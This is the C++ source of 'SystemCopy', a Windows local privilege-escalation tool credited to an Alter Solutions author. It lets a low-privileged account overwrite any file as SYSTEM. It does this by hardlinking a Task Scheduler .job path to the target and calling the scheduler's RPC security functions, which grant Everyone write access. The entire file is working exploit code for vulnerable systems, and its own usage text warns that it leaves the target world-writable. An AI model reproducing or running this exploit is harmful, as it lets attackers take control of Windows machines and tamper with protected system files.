//***************************************************************//
// SystemCopy : copy files as system from low privileged account //
// by Yann GASCUEL for Alter Solutions                           //
// Use it at your own risk.                                      //
//***************************************************************//

#include "stdafx.h"
#include "rpc_h.h"
#include <fstream>
#include <ctime>
#pragma comment(lib, "rpcrt4.lib")
using namespace std;

#define BUFSIZE 4096

RPC_STATUS CreateBindingHandle(RPC_BINDING_HANDLE *binding_handle)
{
	RPC_STATUS status;
	RPC_BINDING_HANDLE v5;
	RPC_SECURITY_QOS SecurityQOS = {};
	RPC_WSTR StringBinding = nullptr;
	RPC_BINDING_HANDLE Binding;

	StringBinding = 0;
	Binding = 0;
	status = RpcStringBindingComposeW(L"c8ba73d2-3d55-429c-8e9a-c44f006f69fc", L"ncalrpc", nullptr, nullptr, nullptr, &StringBinding);
	if (status == RPC_S_OK)
	{
		status = RpcBindingFromStringBindingW(StringBinding, &Binding);
		RpcStringFreeW(&StringBinding);
		if (!status)
		{
			SecurityQOS.Version = 1;
			SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
			SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;
			SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_STATIC;

			status = RpcBindingSetAuthInfoExW(Binding, 0, 6u, 0xAu, 0, 0, (RPC_SECURITY_QOS*)&SecurityQOS);
			if (!status)
			{
				v5 = Binding;
				Binding = 0;
				*binding_handle = v5;
			}
		}
	}

	if (Binding)
		RpcBindingFree(&Binding);
	return status;
}

extern "C" void __RPC_FAR * __RPC_USER midl_user_allocate(size_t len)
{
	return(malloc(len));
}

extern "C" void __RPC_USER midl_user_free(void __RPC_FAR * ptr)
{
	free(ptr);
}

bool CreateNativeHardlink(LPCWSTR linkname, LPCWSTR targetname);

int wmain(int argc, wchar_t *argv[])
{
	if (argc != 3)
	{
		printf("usage : %ws srcPath dstPath\n\tsrcFile content will be copied into dstFile.\n\n/!\\ WARNING : The tool leave the dstFile world writable /!\\\n", argv[0]);
		system("PAUSE");
		return E_INVALIDARG;
	}

    wchar_t jobName[32];
    wchar_t jobPath[64];

    wsprintf(jobName, L"SystemCopy-%x", time(nullptr));
    wsprintf(jobPath, L"c:\\windows\\tasks\\%ws.job", jobName);

    // Create Hardlink
    printf("Create hardling : '%ws' -> '%ws'\n", jobPath, argv[2]);
	if (!CreateNativeHardlink(jobPath, argv[2]))
    {
        fprintf(stderr, "ERROR : Can't create hardlink, '%ws' need to be unlocked and readable by the current user.\n", argv[2]);
        return -1;
    }

    // Create RPC binding handle
	RPC_BINDING_HANDLE handle;
	CreateBindingHandle(&handle);

    // Try to set write privilege to "everyone" on the dstFile (using the hardlink, will work only on vulnerable systems)
    printf("Set write privilege for 'EVERYONE' on '%ws'\n", argv[2]);
	HRESULT r1 = _SchRpcCreateFolder(handle, jobName, L"D:(A;;0x1301bf;;;WD)(A;OICIIO;SDGXGWGR;;;WD)", 0);
	printf("%x\n", r1);
	HRESULT r2 = _SchRpcSetSecurity(handle, jobName, L"D:(A;;0x1301bf;;;WD)(A;OICIIO;SDGXGWGR;;;WD)", 0);
	printf("%x\n", r2);

    /*if (r1 != 0 && r2 != 0)
    {
        fprintf(stderr, "ERROR : Can't set privileges, '%ws' need to be writable by the 'system' user and the OS must be vulnerable.\n", argv[2]);
        return -2;
    }*/

    printf("Copy data from '%ws' to '%ws'...\n", argv[1], argv[2]);
    // Try to open the dstFile (will success only if the previous step has worked)
    HANDLE hDst = CreateFile(argv[2], GENERIC_WRITE, 0, NULL, TRUNCATE_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDst == INVALID_HANDLE_VALUE)
    {
        fprintf(stderr, "ERROR : Can't open dstFile, '%ws' may be locked or unwritable by the 'system' user or the system may be unusable.\n", argv[2]);
        return -3;
    }

    // Open the srcFile
	HANDLE hSrc = CreateFile(argv[1], GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hSrc == INVALID_HANDLE_VALUE)
	{
		fprintf(stderr, "ERROR : Can't open srcFile : %ws\n", argv[1]);
		system("PAUSE");
		return -4;
	}

    DWORD len = 0;
	char buf[BUFSIZE] = { 0 };
    // Copy data from srcFile to dstFile
	do {
		ReadFile(hSrc, buf, BUFSIZE, &len, nullptr);
		WriteFile(hDst, buf, len, &len, nullptr);
	} while (len > 0);

	CloseHandle(hSrc);
	CloseHandle(hDst);

	puts("Done\n");
	system("PAUSE");

	return 0;
}
